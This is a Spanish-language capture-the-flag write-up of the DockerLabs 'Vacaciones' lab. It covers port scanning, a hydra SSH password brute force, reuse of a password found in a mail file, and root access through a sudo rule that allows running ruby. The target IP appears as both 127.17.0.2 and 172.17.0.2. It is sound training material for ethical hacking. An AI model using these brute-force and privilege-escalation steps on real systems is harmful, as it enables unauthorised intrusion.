---
title: Vacaciones
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-01-04
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-vacaciones/vacaciones_logo.png
categories:
  - Docker_Labs
tags:
  - linux
  - dockerlabs
  - ssh
  - http
  - tcp
  - data_leaks
  - password_attacks
  - sudo_abuse
  - information_gathering
  - web_analysis
  - lateral_movement
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/vacaciones:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.062 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.062/0.062/0.062/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/vacaciones:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap1 127.17.0.2
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/vacaciones:-$ sudo nmap -sCV -p22,80 -vvv -oN nmap2 127.17.0.2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzT6jdfo9QUX+9zCmyJQNTcAJXdhXByneCfqA9I7cXPBFGDGgxNAfQdoiqH3EMiTjf+maPlCNyVHGFl+sClQa5sJwdrbWZiJPxfxGkCtWiSrRdKKUKt/7rCMKMOy79bFRvurgss+57tsglfXkE9FPkZGd3mLruXt5Lyb+8uhFWpW58Df6ZUoSsJi7n0bkXNpEzJAzYHNmRRtv0RsGDFosi/t5KUCMPX67jbM8jsApIVwFIQBTiwzwGQn33G2ZoAJy/NYZ9dkuN2cKM2uItovo25daA+0/SxEfHqAHGquvoMKSj8pcX3qZVD7cGWlsn9c5QNzHRC2DZUSHrK7UIaG0r
|   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMD2Z/ZotorXbs6zP9Sg9XenjSX0HIjYjoEH2cAV7aDoQXZKrssz5AJ98j8b4ntOPGfVehrcRv9X7lKswOea9HM=
|   256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK/0ZadHoPSGKg31xFAhPaX854MMS09s5JgdzqmD3jCl
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/dockerlabs/vacaciones:-$ whatweb 127.17.0.2
http://127.17.0.2 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[127.17.0.2]
```

---
## Web Analysis

Al analizar la página web, inicialmente parece estar completamente vacía. 

![](assets/img/dockerlabs-writeup-vacaciones/vacaciones1.png)

Sin embargo, al inspeccionar el código fuente, encuentro el siguiente comentario:

![](assets/img/dockerlabs-writeup-vacaciones/vacaciones2.png)

Este comentario sugiere dos posibles nombres de usuario ```Juan``` y ```Camilo```. Dado que no hay más pistas disponibles, decido enfocar la prueba en el servicio SSH para intentar un ataque de fuerza bruta utilizando uno de los nombres.

```terminal
/home/kali/Documents/dockerlabs/vacaciones:-$ sudo hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
```

![](assets/img/dockerlabs-writeup-vacaciones/vacaciones3.png)

El ataque tiene éxito y obtengo las credenciales SSH.

```terminal
/home/kali/Documents/dockerlabs/vacaciones:-$ ssh camilo@127.17.0.2
camilo@127.17.0.2's password: 
$ id
uid=1001(camilo) gid=1001(camilo) groups=1001(camilo)
```

---
## User pivoting

Inicio una shell interactiva.

```terminal
$ script /dev/null -c /bin/bash
```

Analizo los usuarios disponibles en el sistema que tienen acceso a una shell.

Además, verifico usuarios configurados con ```sh``` como su shell:

```terminal
camilo@kali:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash

camilo@kali:~$ cat /etc/passwd | grep /sh$
juan:x:1000:1000::/home/juan:/bin/sh
camilo:x:1001:1001::/home/camilo:/bin/sh
pedro:x:1002:1002::/home/pedro:/bin/sh
```

Dentro del directorio de correo de Camilo ```/var/mail/camilo```, descubro un archivo de texto que contiene un mensaje con información importante.

```terminal
camilo@kali:~$ cat /var/mail/camilo/correo.txt 
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

Este mensaje revela una contraseña asociada al usuario ```Juan```.

```terminal
camilo@kali:~$ su juan
Password: 2k84dicb

$ id
uid=1000(juan) gid=1000(juan) groups=1000(juan)
```

---
## Privilege Escalation

Inicio una shell interactiva.

```terminal
$ script /dev/null -c /bin/bash
```

El usuario ```juan``` puede ejecutar el binario ```/usr/bin/ruby``` como ```root``` sin necesidad de proporcionar una contraseña.

```terminal
juan@kali:~$ sudo -l
Matching Defaults entries for juan on kali:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on kali:
    (ALL) NOPASSWD: /usr/bin/ruby
```

Según [GTFOBins](https://gtfobins.github.io/gtfobins/ruby/#sudo), el binario ```/usr/bin/ruby``` permite ejecutar comandos arbitrarios como superusuario.

```terminal
juan@kali:~$ sudo ruby -e 'exec "/bin/sh"'
# id
uid=0(root) gid=0(root) groups=0(root)
```